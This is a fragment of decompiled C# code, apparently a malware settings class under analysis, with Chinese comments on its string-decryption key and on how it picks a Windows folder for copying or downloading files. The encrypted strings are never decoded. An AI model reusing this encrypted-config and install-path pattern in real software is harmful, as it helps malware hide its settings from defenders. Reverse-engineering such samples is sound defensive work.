using System;

// Token: 0x020000E7 RID: 231
public static class GClass35
{
	// Token: 0x060005C4 RID: 1476 RVA: 0x000149EC File Offset: 0x00012BEC
	public static void smethod_0()
	{
		GClass18.smethod_0(GClass35.string_8);//GClass35.string_8 = dYxHB9fbdkKyJsZqTaRz 为字符串解密key
		GClass35.string_9 = GClass18.smethod_5(GClass35.string_9);//解密字符串
		GClass35.string_0 = GClass18.smethod_5(GClass35.string_0);//解密字符串
		GClass35.string_1 = GClass18.smethod_5(GClass35.string_1);//解密字符串
		GClass35.string_2 = GClass18.smethod_5(GClass35.string_2);//解密字符串
		GClass35.string_4 = GClass18.smethod_5(GClass35.string_4);//解密字符串
		GClass35.string_5 = GClass18.smethod_5(GClass35.string_5);//解密字符串
		GClass35.string_6 = GClass18.smethod_5(GClass35.string_6);//解密字符串
		GClass35.string_7 = GClass18.smethod_5(GClass35.string_7);//解密字符串
		GClass35.smethod_1();//判断操作系统，对应文件拷贝下载路径
	}

	// Token: 0x060005C5 RID: 1477 RVA: 0x00014A80 File Offset: 0x00012C80
	private static void smethod_1()
	{
		if (GClass8.Is64Bit)
		{
			return;
		}
		switch (GClass35.specialFolder_0)
		{
		case Environment.SpecialFolder.SystemX86:
			GClass35.specialFolder_0 = Environment.SpecialFolder.System;
			break;
		case Environment.SpecialFolder.ProgramFilesX86:
			GClass35.specialFolder_0 = Environment.SpecialFolder.ProgramFiles;
			break;
		}
		GClass35.string_3 = Environment.GetFolderPath(GClass35.specialFolder_0);
	}

	// Token: 0x040002C4 RID: 708
	public static string string_0 = "j8WmFeeTcQGojUYfw/U5eqyLUvCZobgeZxPM2Iz9D3Q=";

	// Token: 0x040002C5 RID: 709
	public static string string_1 = "za+UMUEybLXM6AN71xo3N7DYji1wAaRpQzzVkHB/u6xUoZz0Kef94kyigEeAvITY";

	// Token: 0x040002C6 RID: 710
	public static int int_0 = 3000;

	// Token: 0x040002C7 RID: 711
	public static string string_2 = "a9eADUMFkBGc+As0Tm4bUy5rtMSUHg9dW7k3TwymOjc=";

	// Token: 0x040002C8 RID: 712
	public static Environment.SpecialFolder specialFolder_0 = Environment.SpecialFolder.ApplicationData;

	// Token: 0x040002C9 RID: 713
	public static string string_3 = Environment.GetFolderPath(GClass35.specialFolder_0);

	// Token: 0x040002CA RID: 714
	public static string string_4 = "BWmMAeT9foiWkmoY4zgoFJuHD9bdfLXFvNWnmUiDktM=";

	// Token: 0x040002CB RID: 715
	public static string string_5 = "v3zYT0zxcwIKI2OWePe66ryb0huxAHm7+MrmiWgGVRs=";

	// Token: 0x040002CC RID: 716
	public static bool bool_0 = false;

	// Token: 0x040002CD RID: 717
	public static bool bool_1 = false;

	// Token: 0x040002CE RID: 718
	public static string string_6 = "yeuxBL0HZdNARv3P5YvKh5rKGNnLG/sO10tpx9LNezoi0p+shYnpx87AzbXnQsqc";

	// Token: 0x040002CF RID: 719
	public static string string_7 = "qw/UZxzrX8lf34XRNPuO4Mn/+cTFX8QMZtZPzLlMiArW67mHqCpHawbp9ozDmXio";

	// Token: 0x040002D0 RID: 720
	public static bool bool_2 = false;

	// Token: 0x040002D1 RID: 721
	public static bool bool_3 = true;

	// Token: 0x040002D2 RID: 722
	public static string string_8 = "dYxHB9fbdkKyJsZqTaRz";

	// Token: 0x040002D3 RID: 723
	public static string string_9 = "plsEbFP204O+SgUmb20QtqoA1OFsYUJWtfscZyy1d3g=";
}
